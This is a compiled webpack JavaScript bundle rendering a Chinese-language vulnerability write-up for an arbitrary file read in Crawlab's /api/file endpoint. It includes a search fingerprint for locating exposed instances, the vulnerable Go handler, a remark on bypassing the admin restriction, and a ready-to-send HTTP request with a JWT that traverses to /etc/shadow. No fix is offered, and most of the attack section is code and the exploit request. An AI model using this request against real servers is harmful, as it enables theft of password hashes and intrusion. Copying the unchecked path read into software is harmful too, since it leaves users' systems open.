(window.webpackJsonp=window.webpackJsonp||[]).push([[147],{2164:function(t,s,a){t.exports=a.p+"assets/img/1639304614319-67b65509-55dd-4205-98cd-1ebdfb164e7b.fe98f2dd.png"},2165:function(t,s,a){t.exports=a.p+"assets/img/1639305536844-3306cb0b-059b-42c1-8c21-c651653d92e9.d2bc5dbe.png"},2166:function(t,s,a){t.exports=a.p+"assets/img/1639305576972-90f4db89-a5b3-47e7-89da-a16927d5bec8.8b067322.png"},2167:function(t,s,a){t.exports=a.p+"assets/img/1639305725285-1b2776a5-d47d-46e1-922f-e2460388e3f8.6a7b009a.png"},3355:function(t,s,a){"use strict";a.r(s);var n=a(63),r=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"crawlab-file-任意文件读取漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#crawlab-file-任意文件读取漏洞"}},[t._v("#")]),t._v(" Crawlab file 任意文件读取漏洞")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("Crawlab 后台 /api/file接口 存在任意文件读取漏洞，攻击者通过漏洞就可以读取服务器中的任意文件")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("Crawlab v0.0.1")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('title="Crawlab"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("登录页面")]),t._v(" "),s("p",[s("img",{attrs:{src:a(2164),alt:"img"}})]),t._v(" "),s("p",[t._v("首先查看路由位置 main.go 文件 中的 file 接口对应的函数")]),t._v(" "),s("p",[s("img",{attrs:{src:a(2165),alt:"img"}})]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[t._v("package routes\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"crawlab/utils"')]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"github.com/gin-gonic/gin"')]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"io/ioutil"')]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"net/http"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v(" @Summary Get "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("file")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v(" @Description Get "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("file")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v(" @Tags "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("file")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v(" @Produce json\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v(" @Param Authorization header string true "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Authorization token"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v(" @Success "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" json string Response\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v(" @Failure "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("400")]),t._v(" json string Response\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("//")]),t._v(" @Router "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("file")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("get"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\nfunc GetFile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("c "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("gin"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Context"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\tpath "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":=")]),t._v(" c"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Query"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"path"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\tfileBytes"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" err "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":=")]),t._v(" ioutil"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("ReadFile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("path"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" err "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!=")]),t._v(" nil "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\tHandleError"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("http"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("StatusInternalServerError"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" c"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" err"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\tc"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("JSON"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("http"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("StatusOK"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" Response"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t\tStatus"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ok"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n\t\tMessage"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"success"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n\t\tData"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("    utils"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("BytesToString"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("fileBytes"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n\t"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br"),s("span",{staticClass:"line-number"},[t._v("20")]),s("br"),s("span",{staticClass:"line-number"},[t._v("21")]),s("br"),s("span",{staticClass:"line-number"},[t._v("22")]),s("br"),s("span",{staticClass:"line-number"},[t._v("23")]),s("br"),s("span",{staticClass:"line-number"},[t._v("24")]),s("br"),s("span",{staticClass:"line-number"},[t._v("25")]),s("br"),s("span",{staticClass:"line-number"},[t._v("26")]),s("br"),s("span",{staticClass:"line-number"},[t._v("27")]),s("br"),s("span",{staticClass:"line-number"},[t._v("28")]),s("br"),s("span",{staticClass:"line-number"},[t._v("29")]),s("br")])]),s("p",[s("img",{attrs:{src:a(2166),alt:"img"}})]),t._v(" "),s("p",[t._v("接口调用为后台才可调用，通过任意用户添加可以完成绕过")]),t._v(" "),s("p",[t._v("path参数可控，发送Get请求读取任意文件")]),t._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[t._v("GET "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("api"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("file")]),t._v("?path"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("etc"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("shadow HTTP"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\nAccept"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("json"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" text"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("plain"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nAuthorization"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("eyJpZCI6IjYwZGQxOWU0YmZjNzg3MDAxZDk1NjBjOSIsIm5iZiI6MTYzOTMwNTI2MiwidXNlcm5hbWUiOiJhZG1pbiJ9"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("mFRAwXN"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("QqTmFmPAxgFEJhVXwxVuxJMepHe4khADfgk\nUser"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Mozilla"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5.0")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Macintosh"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Intel Mac OS X "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10_15_7")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" AppleWebKit"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("KHTML"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" like Gecko"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Chrome"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("96.0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".4664")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".93")]),t._v(" Safari"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v("\nContent"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("json"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("charset"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("UTF"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v("\nAccept"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" deflate\nAccept"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Language"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" zh"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("CN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("zh"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.9")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("en"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("US"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.8")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("en"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.7")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("zh"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("TW"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("q"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.6")]),t._v("\nCookie"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Hm_lvt_c35e3a563a06caee2524902c81975add"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1639222117")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1639278935")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Hm_lpvt_c35e3a563a06caee2524902c81975add"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1639278935")]),t._v("\nx"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("forwarded"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("127.0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".1")]),t._v("\nx"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("originating"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("ip"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("127.0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".1")]),t._v("\nx"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("remote"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("ip"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("127.0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".1")]),t._v("\nx"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("remote"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("127.0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".1")]),t._v("\nConnection"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" close\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br")])]),s("p",[s("img",{attrs:{src:a(2167),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);